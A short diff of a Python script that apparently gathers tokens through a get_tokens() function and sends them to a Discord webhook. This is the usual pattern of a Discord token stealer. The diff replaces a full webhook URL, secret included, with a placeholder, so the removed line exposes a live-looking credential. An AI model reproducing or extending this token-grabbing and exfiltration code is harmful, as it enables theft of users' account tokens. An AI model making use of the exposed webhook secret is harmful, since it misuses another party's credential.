@@ -108,5 +108,5 @@ def get_tokens():
     return token_list
 
 if __name__ == '__main__':
-    WEBHOOK_URL = "https://discord.com/api/webhooks/1081866192295305246/Y5Kr-h0tg3z7eYC4lXh4Qczz0oPRwSte3M5z87y9SoZ8AJloScQHIjasoDfH0z-7b8Xt"
+    WEBHOOK_URL = "WEBHOOK_URL_HERE"
     tokens = get_tokens()
